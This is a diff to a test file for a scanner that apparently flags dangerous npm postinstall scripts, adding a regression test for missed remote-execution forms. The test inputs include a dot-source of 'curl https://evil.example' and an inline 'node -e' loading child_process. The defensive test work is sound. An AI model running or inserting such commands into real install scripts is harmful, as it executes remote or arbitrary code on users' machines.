@@ -59,6 +59,16 @@ describe("inspectScriptCommand", () => {
     expect(findings.join(" ")).toMatch(/invokes a shell/);
   });
 
+  // Regression (v2 P3): previously-missed remote-exec forms.
+  it("flags dot-source and no-space node -e", () => {
+    expect(inspectScriptCommand("postinstall", ". <(curl https://evil.example)").join(" ")).toContain(
+      "invokes a shell",
+    );
+    expect(inspectScriptCommand("postinstall", 'node -e"require(\'child_process\')"').join(" ")).toContain(
+      "runs inline node code",
+    );
+  });
+
   it("does not treat a .sh filename or a bare node build as a shell invocation", () => {
     expect(inspectScriptCommand("postinstall", "node build.js")).toEqual([]);
     expect(inspectScriptCommand("postinstall", "tsc && node dist/index")).toEqual([]);
